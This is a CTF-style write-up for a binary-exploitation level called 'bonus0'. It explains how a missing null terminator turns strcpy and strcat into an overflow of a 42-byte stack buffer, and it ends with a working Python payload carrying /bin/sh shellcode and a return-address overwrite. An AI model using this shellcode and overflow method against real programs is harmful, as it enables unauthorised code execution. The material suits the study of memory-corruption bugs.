@@ -1,0 +1,83 @@
+This level was pretty tricky and complex.
+
+We have one buffer of 42 bytes on the main, that is filled with two input of maximum 20 bytes each.
+
+Each input is zero-terminated replacing the \n character.
+
+`
+char *__cdecl p(char *dest, char *s)
+{
+  char buf[4104]; // [esp+10h] [ebp-1008h] BYREF
+
+  puts(s);
+  read(0, buf, 0x1000u); // <--- 4096 bytes
+  *strchr(buf, 10) = 0;
+  return strncpy(dest, buf, 0x14u);
+}
+
+char *__cdecl pp(char *dest)
+{
+	char src[20]; // [esp+28h] [ebp-30h] BYREF
+	char v3[28]; // [esp+3Ch] [ebp-1Ch] BYREF
+
+	p(src, " - "); // 20 bytes written max (counting the zero-terminator)
+	p(v3, " - "); // 20 bytes written max (counting the zero-terminator)
+	strcpy(dest, src); // <--- src + v3 (40 bytes, dest[39] = '\0)
+	*(_WORD *)&dest[strlen(dest)] = unk_80486A4; // dest[39] = ' \0' (\x20\x00) -- len(dest) = 41
+	return strcat(dest, v3); //dest + v3 = 60 bytes
+}
+`
+
+So as seen on the source here, after both input filled, the destination buffer will be filled with the first input,
+then the zero-terminator will be replaced with a space and a zero-terminator will be added just after.
+
+Then the second input will be concatenated to the first one.
+
+The breach is on the first input, if we don't input a '\n' character, the first input won't have a zero-terminator and
+the strcpy will overflow on the second input.
+-> dest will then be filled with 20 bytes of the first input, then 20 bytes of the second input (including the zero-terminator).
+
+After that, the rest of the function is done normally and we're left with a destination buffer that is 
+filled with 60 bytes (including the zero-terminator).
+-> src (41 bytes) + v3 (19 bytes) = 60 bytes
+
+`
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+	char s[42]; // [esp+16h] [ebp-2Ah] BYREF
+
+	pp(s); // <--- 60 bytes (s[39] = ' ' && s[59] = '\0')
+	puts(s);
+	return 0;
+}
+`
+
+So we have a buffer of 42 bytes, but the function pp will write 60 bytes on it.
+As the buffer is 59 (60 with the zero-terminator) bytes, we can easily* write a shellcode in it and overflow the return address of main().
+-> Looking on gdb, we can see that the eip return address of main() is at 0xbffff70c, and that the buffer s[42] is at 0xbffff6d6.
+
+So we have 0xbffff70c - 0xbffff6d6 = 54 bytes of difference between the buffer and the return address.
+-> We then have to write 54 bytes of padding, then the address of the buffer (which will be filled with the shellcode), some padding, and then the address of the shellcode.
+
+We can't write a shellcode fully on the first input, as it is 20 bytes max, so we need to split it with the second input.
+Also, as the program is doing 2 reads, we have to fully fill the read length of the first input so that the rest
+is read on the second input (with still a '\n' at the end to simulate the enter key).
+-> python -c "print '\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89' + 'a'*4075 + '\n\xe2\xb0\x0b\xcd\x80'"
+
+We then add the padding and the address. And as the second input is already filled with 5 bytes, we have 20 - 5 = 15 bytes left to write.
+The address is 4 bytes, so we have 11 bytes of filling.
+Given that we also actually write on the 41th byte and that the address of the buffer is 0xbffff6d6:
+-> 40 + 5 = 45 (the rest of the shellcode)
+-> 54 - 45 = 9 (the padding)
+-> 54 + 4 = 58 (the address of the buffer)
+-> 58 + 1 = 59 (the padding)
+-> s[59] = '\0' (the zero-terminator)
+
+The padding on s[58] is very important, as the pp() function will actually write :
+-> src + v3 + v3 ( 20 + 20 + 20 ) = 60 bytes
+So if we don't add the last character padding on the v3[18], it will be 19 characters long only.
+
+`
+python -c "print '\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89' + 'a'*4075 + '\n\xe2\xb0\x0b\xcd\x80' + '\x90' * 9 + '\xd6\xf6\xff\xbf' + '\x90'" > /tmp/bonus0_test
+cat /tmp/bonus0_test - | ./bonus
+`
